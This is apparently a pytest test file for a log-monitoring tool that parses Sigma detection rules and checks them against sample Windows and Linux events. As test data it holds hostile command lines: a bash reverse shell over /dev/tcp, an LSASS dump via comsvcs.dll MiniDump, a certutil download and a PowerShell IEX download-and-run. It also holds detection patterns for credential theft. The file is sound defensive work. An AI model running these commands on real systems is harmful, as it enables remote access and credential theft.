from datetime import datetime, timezone

import pytest

from logagent import sigma
from logagent.collectors.windows import _fallback_message
from logagent.model import Event
from logagent.signals import load_rules, match_rules

RULES = load_rules()


def win(prov, eid, data, chan="Security"):
    return Event(ts=datetime.now(timezone.utc), host="h", source=f"windows:{chan}", severity=6,
                 message=_fallback_message(prov, eid, data), program=prov, event_id=eid, fields=data)


def lin(msg, prog="bash"):
    return Event(ts=datetime.now(timezone.utc), host="h", source="syslog", severity=6, message=msg, program=prog)


def test_yaml_subset():
    doc = sigma.yaml_load("""
title: 'It''s a test'   # comment
tags:
    - attack.t1059.001
description: |
    line one
    line two
detection:
    sel:
        - Image|endswith: '\\powershell.exe'
          CommandLine|contains|all: ['-enc', 'hidden']
        - EventID: 4104
    condition: sel
level: high
""")
    assert doc["title"] == "It's a test" and doc["tags"] == ["attack.t1059.001"]
    assert doc["description"] == "line one\nline two" and doc["level"] == "high"
    assert doc["detection"]["sel"][0] == {"Image|endswith": "\\powershell.exe", "CommandLine|contains|all": ["-enc", "hidden"]}
    assert doc["detection"]["sel"][1] == {"EventID": 4104}


def _rule(det, logsource=None, **kw):
    return sigma.SigmaRule({"title": "t", "logsource": logsource or {"product": "windows"}, "detection": det, **kw}, "t.yml")


def test_modifiers_and_conditions():
    r = _rule({"img": {"Image|endswith": "\\rundll32.exe"}, "cli": {"CommandLine|contains|all": ["comsvcs", "minidump"]},
               "filter": {"SubjectUserName": "SYSTEM"}, "condition": "img and cli and not filter"},
              {"category": "process_creation", "product": "windows"}, tags=["attack.t1003.001"], level="critical")
    hit = win("Microsoft-Windows-Security-Auditing", "4688", {"NewProcessName": r"C:\Windows\System32\rundll32.exe",
              "CommandLine": "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump 664 x.dmp full", "SubjectUserName": "bob"})
    assert r.matches(hit) and r.attack == ("T1003.001",) and r.score == 95
    hit.fields["SubjectUserName"] = "SYSTEM"
    assert not r.matches(hit)
    k = _rule({"keywords": ["/dev/tcp/"], "condition": "keywords"}, {"product": "linux"})
    assert k.matches(lin("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")) and not k.matches(lin("ls /dev"))
    one_of = _rule({"s1": {"EventID": 1102}, "s2": {"EventID": 104}, "condition": "1 of s*"})
    assert one_of.matches(win("Microsoft-Windows-Eventlog", "104", {}, "System"))
    cidr = _rule({"s": {"EventID": 4625, "IpAddress|cidr": "10.0.0.0/8"}, "condition": "s"})
    assert cidr.matches(win("x", "4625", {"IpAddress": "::ffff:10.1.2.3"})) and not cidr.matches(win("x", "4625", {"IpAddress": "8.8.8.8"}))
    wild = _rule({"s": {"CommandLine": "*-urlcache*http*"}, "condition": "s"}, {"category": "process_creation", "product": "windows"})
    assert wild.matches(win("x", "4688", {"CommandLine": "certutil -urlcache -f http://x/a"}))
    assert not wild.matches(lin("certutil -urlcache -f http://x/a"))  # product windows only


@pytest.mark.parametrize("det", [
    {"s": {"x": 1}, "condition": "s | count() > 5"},
    {"s": {"CommandLine|base64offset|contains": "x"}, "condition": "s"},
    {"s": {"x": 1}, "condition": "s and other"},
])
def test_unsupported_rules_are_refused(det):
    with pytest.raises(sigma.Unsupported):
        _rule(det)


def test_load_dir_counts_skips(tmp_path):
    (tmp_path / "ok.yml").write_text("title: ok\nlogsource:\n    product: linux\ndetection:\n    k:\n        - evil\n    condition: k\n")
    (tmp_path / "agg.yml").write_text("title: agg\nlogsource:\n    product: linux\ndetection:\n    k:\n        - x\n    condition: k | count() > 3\n")
    (tmp_path / "notes.yml").write_text("just: a config file\n")
    rules, skipped = sigma.load_dir(tmp_path)
    assert [r.title for r in rules] == ["ok"] and len(skipped) == 2


def test_bundled_examples_load():
    rules, skipped = sigma.load_dir("rules/sigma")
    assert len(rules) >= 3 and not skipped


@pytest.mark.parametrize("ev, rule", [
    (win("Microsoft-Windows-Sysmon", "10", {"SourceImage": r"C:\Users\Public\x.exe", "TargetImage": r"C:\Windows\System32\lsass.exe"},
         "Microsoft-Windows-Sysmon/Operational"), "win_sysmon_lsass"),
    (win("Microsoft-Windows-Sysmon", "13", {"TargetObject": r"HKU\S\Software\Microsoft\Windows\CurrentVersion\Run\upd"},
         "Microsoft-Windows-Sysmon/Operational"), "win_sysmon_run_key"),
    (win("Microsoft-Windows-PowerShell", "4104", {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x')"},
         "Microsoft-Windows-PowerShell/Operational"), "win_ps_suspicious"),
    (win("Microsoft-Windows-Security-Auditing", "5140", {"ShareName": r"\\*\ADMIN$"}), "win_admin_share"),
    (win("Microsoft-Windows-Security-Auditing", "4698", {"TaskName": r"\Updater"}), "win_task_created"),
    (win("Microsoft-Windows-Security-Auditing", "4719", {"SubjectUserName": "x"}), "win_audit_policy"),
    (win("Microsoft-Windows-Security-Auditing", "4769", {"ServiceName": "MSSQLService", "TicketEncryptionType": "0x17"}), "win_kerberoast"),
])
def test_windows_rules(ev, rule):
    assert rule in [r.id for r in match_rules(ev, RULES)]


@pytest.mark.parametrize("ev", [
    win("Microsoft-Windows-Sysmon", "10", {"SourceImage": r"C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe",
                                           "TargetImage": r"C:\Windows\System32\lsass.exe"}, "Microsoft-Windows-Sysmon/Operational"),
    win("Microsoft-Windows-PowerShell", "4104", {"ScriptBlockText": "Get-ChildItem C:\\Logs"}, "Microsoft-Windows-PowerShell/Operational"),
    win("Microsoft-Windows-Security-Auditing", "4769", {"ServiceName": "DC01$", "TicketEncryptionType": "0x17"}),
    win("Microsoft-Windows-Security-Auditing", "4769", {"ServiceName": "krbtgt", "TicketEncryptionType": "0x17"}),
])
def test_windows_rules_stay_quiet_on_benign(ev):
    assert not [r.id for r in match_rules(ev, RULES) if r.category == "security"]
